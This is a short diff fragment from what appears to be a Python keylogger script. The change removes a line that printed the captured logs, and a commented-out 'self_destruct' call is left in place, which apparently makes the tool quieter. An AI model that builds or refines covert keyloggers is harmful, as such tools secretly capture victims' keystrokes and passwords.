@@ -60,6 +60,5 @@ if __name__ == '__main__':
     while keylog.flag != 1:
         time.sleep(10)
         logs = keylog.read_logs()
-        print(logs)
         # keylog.self_destruct()
     t.join()
